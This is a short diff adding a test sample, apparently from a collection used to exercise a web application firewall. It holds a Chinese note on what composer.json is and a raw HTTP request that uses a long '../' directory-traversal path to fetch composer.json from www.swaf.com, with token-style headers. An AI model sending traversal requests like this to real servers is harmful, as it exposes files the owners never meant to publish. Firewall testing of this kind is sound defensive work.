@@ -1,0 +1,9 @@
+# 目录遍历_composer.json
+# composer.json文件通常用于描述和管理PHP项目的依赖关系。通过composer.json文件，开发人员可以指定项目所需的各种依赖包及其版本信息，以便使用Composer工具来自动下载和安装这些依赖项。
+GET /../../../../../../../../../../../composer.json?acid=80050822&bid=hd_tag_m8mv24kr HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv24kr
+RM-PRO-Token: 6b7da7aadd51156f8e724d9db608416e
+RM-PRO-Time: 1742808389154
+User-Agent: curl/7.83.1
+
